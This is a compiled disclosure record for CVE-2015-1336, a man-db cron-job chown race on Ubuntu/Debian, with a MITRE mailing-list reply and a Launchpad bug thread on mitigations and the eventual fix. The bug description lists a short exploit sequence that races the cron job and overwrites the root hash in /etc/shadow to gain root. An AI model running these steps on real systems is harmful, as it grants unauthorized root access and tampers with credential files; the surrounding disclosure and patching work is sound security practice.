* Man-db insecure chown CVE: [CVE-2015-1336](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1336)

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from www.openwall.com_286dc8e9_20250124_122557.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](10) [[next>]](12) [[<thread-prev]](8) [[thread-next>]](12) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20151214193113.546CDABC018@smtpvmsrv1.mitre.org>
Date: Mon, 14 Dec 2015 14:31:13 -0500 (EST)
From: cve-assign@...re.org
To: oss-security@...ts.openwall.com
Cc: cve-assign@...re.org
Subject: Re: User man Local Root Exploit/Linux Kernel setgid Directory Privilege Escalation/PAM Owner Check Weakness

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>
> <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

The MITRE CVE team doesn't exactly know what we can do with these
references. The first one mentions a CVE ID from Ubuntu,
CVE-2015-1336, but
<http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1336.html>
doesn't yet exist. Possibly the CVE ID is supposed to be for use of
"chown man" in /etc/cron.daily/man-db within both Ubuntu and Debian
distributions.

The second one doesn't mention any CVE ID. Would it be useful for
MITRE to assign a CVE ID for the permissions/ownerships error of:

  drwxr-sr-x 25 man root 4096 May 15 00:40 /var/cache/man

? Our understanding is that this is, more or less, currently
unsupported by the Linux kernel. In other words, it is not valid to
choose that specific set of permissions/ownerships if one is concerned
about an attack by someone with the uid of the man account. This issue
affects both Ubuntu and Debian distributions.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJWbxiyAAoJEL54rhJi8gl552wP/3D/YIy6rhxrmiWHUXu0gxAA
Xq8HHyVOTT1o1ZWmY/BkKWfGXMjD0CcE46ie0e2nqaT2DBtcr94n3djJ7TeAcrjf
D8lS7TTqMzO5IjR0kAWxxj9UzwUeKDjQk7//u4RGm1+5zm6wx3V9ES5Ey3I7eBu9
+Xb92pIl00PFaJ0xR8mYXiwBYtEDXgeY3F7AXeVWU+yGlfgJ+vZYJvb8wCm/daYE
6Flg2+6ij2UUjx5UJd1SG6k1j7vfzWHYf0nqJvZwyTUN/ljBV3Nq4Q2er/4DYsaQ
g+hEC3g3hFVqfeJKyi1fBFmk784bCR3hrBXPiwEB+61bFTIpXSX55sZiaqlKxFad
LcJqOUDkqUlhR0+KUIXYgVEKHPrmJtfJZAbZdZYpNuduSnVsS7T+A5ub3Brz1CZs
zaIwemEIgKV5o9YRSF51ZBWj2yecUdkpQ53388b0NyHCx+g9G1w4CpLxnKtVZJOm
YYp1kn3HgqXJ1l2L5HrDlrNW0KN6P6YrxgG6lr0gUwVd96ER8823m95kteiEik2p
J+SWLnphlWvSjVUU3Bwlg/iHzOOY2HOPycEb/SJhqg6FTGzs55QPkrSQnU4hdOgF
EojG2z3HzXcB6edefm/O/WWhosQ+NJhxdaO4/rnTxtfV2sokt/6988eiK8to7kdk
gGnY6T6rbsl7x+DBnpHr
=lZEJ
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from packetstormsecurity.com_c78e85ec_20250124_122555.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from bugs.launchpad.net_8e5ccbaf_20250124_122600.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[man-db package](https://launchpad.net/ubuntu/%2Bsource/man-db)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/man-db)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/man-db)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/man-db)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/man-db)

# man-db daily cron job TOCTOU bug when processing catman pages

Bug #1482786 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2015-08-07

[262](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [apport (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/apport "Latest release: 2.31.0-0ubuntu3, uploaded to main on 2025-01-17 22:47:11.031736+00:00 by Benjamin Drung (bdrung), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |
|  | [man-db (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db "Latest release: 2.13.0-1, uploaded to main on 2024-08-29 16:39:51.762023+00:00 by Colin Watson (cjwatson), maintained by Colin Watson (cjwatson)") | Fix Released | High | [Colin Watson](https://launchpad.net/~cjwatson) |  |
|  | [pam (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/pam "Latest release: 1.4.0-11ubuntu2.5, uploaded to main on 2024-11-20 15:30:11.995553+00:00 by Ponnuvel Palaniyappan (pponnuvel), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Undecided | Unassigned |  |
|  | [shadow (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow "Latest release: 1:4.16.0-7ubuntu1, uploaded to main on 2025-01-13 22:04:10.516110+00:00 by Skia (hyask), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Undecided | Unassigned |  |

### Bug Description

The daily mandb cleanup job for old catman pages changes the permissions of all non-man files to user man. The problematic code is:

# expunge old catman pages which have not been read in a week

if [ -d /var/cache/man ]; then

  cd /

  if ! dpkg-statoverride --list /var/cache/man >/dev/null 2>1; then

    find /var/cache/man -ignore\_readdir\_race ! -user man -print0 | \

      xargs -r0 chown -f man || true

  fi

  ...

By creating a hard link and winning the race, user man may escalate privileges to user root. See [1] for full explanation.

man# mkdir -p /var/cache/man/etc

man# ln /var/crash/.lock /var/cache/man/etc/shadow

man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0 --MovePath /var/cache/man/etc --LinkTarget /etc

... Wait till daily cronjob was run

man# cp /etc/shadow .

man# sed -r -e 's/^root:.\*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/' /etc/shadow > x

man# cat x > /etc/shadow; rm x

man# su -s /bin/sh (password is 123)

root# cat shadow > /etc/shadow; chown root /etc/shadow

# lsb\_release -rd

Description: Ubuntu 14.04.3 LTS

Release: 14.04

# apt-cache policy man-db

man-db:

  Installed: 2.6.7.1-1ubuntu1

  Candidate: 2.6.7.1-1ubuntu1

  Version table:

 \*\*\* 2.6.7.1-1ubuntu1 0

        500 <http://archive.ubuntu.com/ubuntu/> trusty-updates/main amd64 Packages

        100 /var/lib/dpkg/status

     2.6.7.1-1 0

        500 <http://archive.ubuntu.com/ubuntu/> trusty/main amd64 Packages

[1] <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>

## CVE References

* [2015-1336](/bugs/cve/2015-1336 "The daily mandb cleanup job in Man-db...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-08: |  |  | [#1](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/1) |
| --- | --- | --- | --- |

Thanks Halfdog, this is as usual very interesting.

I think there's several issues here that should be addressed:

- apport's /var/crash/.lock should be set mode 600 instead of 777

- mandb should be rebuilt with ./configure --disable-cats

- the cronjobs and systemd tmp file handling should be removed

At least, I think it's time to remove the cat pages. They seem more trouble than they are worth. I'm not sure why the cronjob changes file ownership and I'm having trouble finding out why it would need to. So I'd rather remove it, and the reason for it to exist. Are there other mediation steps that we should take?

Removing the cat pages is a fairly large change but I'm not seeing smaller options that would address this without removing them. Are there any other smaller steps that I've overlooked?

Thanks

Thanks Halfdog, this is as usual very interesting.
I think there's several issues here that should be addressed:
- apport's /var/crash/.lock should be set mode 600 instead of 777
- mandb should be rebuilt with ./configure --disable-cats
- the cronjobs and systemd tmp file handling should be removed
At least, I think it's time to remove the cat pages. They seem more trouble than they are worth. I'm not sure why the cronjob changes file ownership and I'm having trouble finding out why it would need to. So I'd rather remove it, and the reason for it to exist. Are there other mediation steps that we should take?
Removing the cat pages is a fairly large change but I'm not seeing smaller options that would address this without removing them. Are there any other smaller steps that I've overlooked?
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-08: |  |  | [#2](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/2) |
| --- | --- | --- | --- |

Oh yes, also:

- pam / shadow ought to verify /etc/shadow and other files for correct permissions

Oh yes, also:
- pam / shadow ought to verify /etc/shadow and other files for correct permissions

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in man-db (Ubuntu): | |
| **status**: | New → Confirmed |
| Changed in pam (Ubuntu): | |
| **status**: | New → Confirmed |
| Changed in shadow (Ubuntu): | |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-08: |  |  | [#3](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/3) |
| --- | --- | --- | --- |

I second all your recommendations. Just trying to do some considerations from Ubuntu (distributor's ) point of view:

I do not know, if catman is still used, someone might complain. If yes, then in my opinion, creation of files by catman is the problem: when catman is run as user "man", the chown is not required, removal is done as user "man" anyway. So privilege separation would be OK.

If cat pages are generated as user "root", storing them in directory writable by user "man" is VERY risky and should not be performed anyway. In that case separation of storage locations should be more the way to go.

About PAM: I did not verify, if PAM does or does not perform permission checks, in that case the owner check is the problematic part. Here I do not known, if there might be regressions due to unexpected use of passwd/shadow tools together with the chroot option to operate on offline uid-namespaced containers, e.g. switched off LXC before poweron. In that case, the tools could refuse to operate.

I second all your recommendations. Just trying to do some considerations from Ubuntu (distributor's ) point of view:
I do not know, if catman is still used, someone might complain. If yes, then in my opinion, creation of files by catman is the problem: when catman is run as user "man", the chown is not required, removal is done as user "man" anyway. So privilege separation would be OK.
If cat pages are generated as user "root", storing them in directory writable by user "man" is VERY risky and should not be performed anyway. In that case separation of storage locations should be more the way to go.
About PAM: I did not verify, if PAM does or does not perform permission checks, in that case the owner check is the problematic part. Here I do not known, if there might be regressions due to unexpected use of passwd/shadow tools together with the chroot option to operate on offline uid-namespaced containers, e.g. switched off LXC before poweron. In that case, the tools could refuse to operate.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-08-13: |  |  | [#4](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/4) |
| --- | --- | --- | --- |

The man-db insecure chown issue gets CVE-2015-1336.

The man-db insecure chown issue gets CVE-2015-1336.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-08-13: |  |  | [#5](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/5) |
| --- | --- | --- | --- |

Since this isn't a high-severity issue, I would like to make it public so that Debian and Ubuntu can work on a fix.

When can we make this public?

Since this isn't a high-severity issue, I would like to make it public so that Debian and Ubuntu can work on a fix.
When can we make this public?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-14: |  |  | [#6](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/6) |
| --- | --- | --- | --- |

I see it the same way. I would also include publication of the group man to group root privilege escalation via the setgid directory (the e-mails from 2015-05-15 03:00:46 on [1]), which may also use part of the same technique here but was caused by a combination of different factors, one including the kernel, but not clear, which component is at fault and where to start with the fix. The discussion at security-at-kernel.org also ended about 2015-07-06 without final conclusion.

Should I add a second bug report for this other problem, e.g. against package kernel and man-db? Or do publication and see, what will be consensus after discussion and then decide about affected package and way to fix?

Just make the issues public when you feel, that it makes sense.

[1] <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

I see it the same way. I would also include publication of the group man to group root privilege escalation via the setgid directory (the e-mails from 2015-05-15 03:00:46 on [1]), which may also use part of the same technique here but was caused by a combination of different factors, one including the kernel, but not clear, which component is at fault and where to start with the fix. The discussion at security-at-kernel.org also ended about 2015-07-06 without final conclusion.
Should I add a second bug report for this other problem, e.g. against package kernel and man-db? Or do publication and see, what will be consensus after discussion and then decide about affected package and way to fix?
Just make the issues public when you feel, that it makes sense.
[1] http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-15: |  |  | [#7](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/7) |
| --- | --- | --- | --- |

Can you please give me (= upstream, Debian maintainer) a chance to think about it before doing anything invasive like switching to --disable-cats? That seems to me to be a significant change beyond what I'd normally expect the security team to do, and I expect that this can be fixed otherwise.

Can you please give me (= upstream, Debian maintainer) a chance to think about it before doing anything invasive like switching to --disable-cats? That seems to me to be a significant change beyond what I'd normally expect the security team to do, and I expect that this can be fixed otherwise.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-15: |  |  | [#8](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/8) |
| --- | --- | --- | --- |

Incidentally, I'm a little surprised that this is the first I heard of it given the linked timeline. Did I miss an e-mail somewhere, given that I'm the primary maintainer of this code? I was lucky and happened to notice mails pertaining to this bug in a very busy e-mail folder, but could easily have missed it - a direct notification would have been much more reliable.

Incidentally, I'm a little surprised that this is the first I heard of it given the linked timeline. Did I miss an e-mail somewhere, given that I'm the primary maintainer of this code? I was lucky and happened to notice mails pertaining to this bug in a very busy e-mail folder, but could easily have missed it - a direct notification would have been much more reliable.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-08-18: |  |  | [#9](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/9) |
| --- | --- | --- | --- |

Colin, there was a related issue that Halfdog reported to us in May that used the /var/cache/man/ directory in conjunction with a kernel oddity to provide a different group man -> root user vulnerability. It's not widely known, but is documented at <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

This second flaw is what encouraged me to suggest taking the more drastic step of disabling the catdoc functionality.

If you can find other solutions that are less invasive, it certainly would be more in keeping with the style of security updates. But with the speed of modern machines, I'm not sure catdocs are as useful as they used to be, so it seemed like an easy step to take to mitigate security problems, both these two and potentially future issues.

Thanks

Colin, there was a related issue that Halfdog reported to us in May that used the /var/cache/man/ directory in conjunction with a kernel oddity to provide a different group man -> root user vulnerability. It's not widely known, but is documented at http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
This second flaw is what encouraged me to suggest taking the more drastic step of disabling the catdoc functionality.
If you can find other solutions that are less invasive, it certainly would be more in keeping with the style of security updates. But with the speed of modern machines, I'm not sure catdocs are as useful as they used to be, so it seemed like an easy step to take to mitigate security problems, both these two and potentially future issues.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2015-08-18: |  |  | [#10](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/10) |
| --- | --- | --- | --- |

My train of thought is that the setgid bit isn't inherently necessary to make cat files work - it was added before my time as maintainer with an unsatisfying explanation, and I've long been intending to look into it properly - and the cron job was there to work around a problem that was never fully diagnosed. IOW, neither of these issues are central to cat files. I plan to pare these things away, but I need to do some auditing to make sure that I'm not going to break anything else in the process.

My train of thought is that the setgid bit isn't inherently necessary to make cat files work - it was added before my time as maintainer with an unsatisfying explanation, and I've long been intending to look into it properly - and the cron job was there to work around a problem that was never fully diagnosed. IOW, neither of these issues are central to cat files. I plan to pare these things away, but I need to do some auditing to make sure that I'm not going to break anything else in the process.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-08-19: |  |  | [#11](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/11) |
| --- | --- | --- | --- |

Regarding #9 "It's not widely known, but is documented...": currently the document links were provided only to security folks (kernel security, Ubuntu security, Launchpad) working on the issue, there are no known public references to it yet. As long as information does not leak or someone guesses the URL, there is still some time for thorough analysis and fixing.

Regarding #9 "It's not widely known, but is documented...": currently the document links were provided only to security folks (kernel security, Ubuntu security, Launchpad) working on the issue, there are no known public references to it yet. As long as information does not leak or someone guesses the URL, there is still some time for thorough analysis and fixing.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2015-10-19: |  |  | [#12](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/12) |
| --- | --- | --- | --- |

Has there been any progress on fixing this issue?

Has there been any progress on fixing this issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-10-24: |  |  | [#13](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/13) |
| --- | --- | --- | --- |

Not to my knowledge. Perhaps it is unclear how to proceed as the issue was tagged with apport/pam/shadow after reporting it against mandb. I could split them up, perhaps that would simplify a little.

Apart from that: the mandb issue seems of low-impact, perhaps making it public would help to attract other developers to assist in fixing.

Not to my knowledge. Perhaps it is unclear how to proceed as the issue was tagged with apport/pam/shadow after reporting it against mandb. I could split them up, perhaps that would simplify a little.
Apart from that: the mandb issue seems of low-impact, perhaps making it public would help to attract other developers to assist in fixing.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2015-11-23: |  |  | [#14](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/14) |
| --- | --- | --- | --- |

As the issue seems to be minor and there was no progress in the last 3 month, does anyone have objections making this public 2015-11-30 00:00 to give others a chance to fix it?

(Also notified Colin Watson according to this note from 2015-08-15)

As the issue seems to be minor and there was no progress in the last 3 month, does anyone have objections making this public 2015-11-30 00:00 to give others a chance to fix it?
(Also notified Colin Watson according to this note from 2015-08-15)

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2015-12-14

| **information type**: | Private Security → Public Security |
| --- | --- |

[Mathew Hodson (mhodson)](https://launchpad.net/~mhodson)
on 2016-02-02

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Medium |

[jose (josekm36-j)](https://launchpad.net/~josekm36-j)
on 2016-06-04

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |
| Changed in man-db (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |
| Changed in pam (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |
| Changed in shadow (Ubuntu): | |
| **status**: | Confirmed → Fix Committed |

[Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur)
on 2016-06-04

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Confirmed |
| Changed in man-db (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |
| Changed in pam (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |
| Changed in shadow (Ubuntu): | |
| **status**: | Fix Committed → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2016-12-11: |  |  | [#15](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/15) |
| --- | --- | --- | --- |

Apologies for my long delay in dealing with these bugs, both reported by halfdog. Fixes turned out to be quite complicated, since in part they involved unwinding incorrect logic from nearly 20 years ago and ensuring that everything else built on that was appropriately adjusted.

Here are the relevant sections from my release announcement, which should appear at <https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html> in the near future:

\* SECURITY: Eliminate dangerous setgid-root directories. In the default

    configuration, cache files and directories are now owned by man:man

    rather than man:root; man and mandb are now setgid man as well as

    setuid man (except in the --disable-setuid case). This is a much

    simpler and safer solution to the original problem that caused my

    predecessor to make directories setgid root, and doesn't introduce any

    interesting new privilege since the man group's only real purpose is

    to be the man user's primary group and nothing in cache directories is

    group-writeable.

Maintainers of distribution packagers should take care to review their

    installation rules in light of this change.

As far as I know this has no CVE ID, but it is described here:

<http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

[...]

Notes for distributors

  ======================

The security fix above was quite involved. If you're trying to backport

  it to a stable release, then you should probably consider at least these

  commits:

e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x\* functions

    9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings

    0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from --enable-setuid option

    94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely

    c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply --disable-setuid

    31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root directories

    755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following cache-owner/setuid changes

    75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of /var/cache/man

Feel free to contact me if you have difficulty. You should also

  consider

  <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>,

  which could not be fixed without fixing the above bug first; while this

  bug was in Debian-specific cron jobs, others may have copied them.

I've uploaded 2.7.6-1 to unstable with fixes for these vulnerabilities. I'd be happy to help out the Debian and Ubuntu security teams with backports if they need it, although hopefully the above list of git commits is enough to get started.

Apologies for my long delay in dealing with these bugs, both reported by halfdog. Fixes turned out to be quite complicated, since in part they involved unwinding incorrect logic from nearly 20 years ago and ensuring that everything else built on that was appropriately adjusted.
Here are the relevant sections from my release announcement, which should appear at https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html in the near future:
\* SECURITY: Eliminate dangerous setgid-root directories. In the default
configuration, cache files and directories are now owned by man:man
rather than man:root; man and mandb are now setgid man as well as
setuid man (except in the --disable-setuid case). This is a much
simpler and safer solution to the original problem that caused my
predecessor to make directories setgid root, and doesn't introduce any
interesting new privilege since the man group's only real purpose is
to be the man user's primary group and nothing in cache directories is
group-writeable.
Maintainers of distribution packagers should take care to review their
installation rules in light of this change.
As far as I know this has no CVE ID, but it is described here:
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
[...]
Notes for distributors
======================
The security fix above was quite involved. If you're trying to backport
it to a stable release, then you should probably consider at least these
commits:
e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x\* functions
9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings
0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from --enable-setuid option
94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely
c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply --disable-setuid
31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root directories
755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following cache-owner/setuid changes
75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of /var/cache/man
Feel free to contact me if you have difficulty. You should also
consider
http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/,
which could not be fixed without fixing the above bug first; while this
bug was in Debian-specific cron jobs, others may have copied them.
I've uploaded 2.7.6-1 to unstable with fixes for these vulnerabilities. I'd be happy to help out the Debian and Ubuntu security teams with backports if they need it, although hopefully the above list of git commits is enough to get started.

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **assignee**: | nobody → Colin Watson (cjwatson) |
| **importance**: | Medium → High |
| **status**: | Confirmed → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-12-13: |  |  | [#16](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/16) |
| --- | --- | --- | --- |

This bug was fixed in the package man-db - 2.7.6.1-1

---------------

man-db (2.7.6.1-1) unstable; urgency=medium

\* New upstream release:

    - Don't chmod CACHEDIR.TAG if it doesn't exist (closes: #847810).

-- Colin Watson <email address hidden> Mon, 12 Dec 2016 12:51:57 +0000

This bug was fixed in the package man-db - 2.7.6.1-1
---------------
man-db (2.7.6.1-1) unstable; urgency=medium
\* New upstream release:
- Don't chmod CACHEDIR.TAG if it doesn't exist (closes: #847810).
-- Colin Watson <cjwatson@debian.org> Mon, 12 Dec 2016 12:51:57 +0000

| Changed in man-db (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Chris Adams (acdha)](https://launchpad.net/~acdha) wrote on 2018-08-27: |  |  | [#17](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/17) |
| --- | --- | --- | --- |

Was the decision made not to backport this to 14.04 and 16.04 LTS?

Was the decision made not to backport this to 14.04 and 16.04 LTS?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2020-05-20: |  |  | [#18](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/18) |
| --- | --- | --- | --- |

@cjwatson - is it safe to assume the fix was entirely in man-db? Or was shadow supposed to do something here as well?

@cjwatson - is it safe to assume the fix was entirely in man-db? Or was shadow supposed to do something here as well?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Colin Watson (cjwatson)](https://launchpad.net/~cjwatson) wrote on 2020-05-20: |  |  | [#19](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/19) |
| --- | --- | --- | --- |

@serge-hallyn: The fix for the reported bug was entirely in man-db (see comment #15), although it was a combination of upstream and packaging work. The apport, pam, and shadow tasks were spun off by @sarnold; the pam/shadow tasks are explained in comment #2.

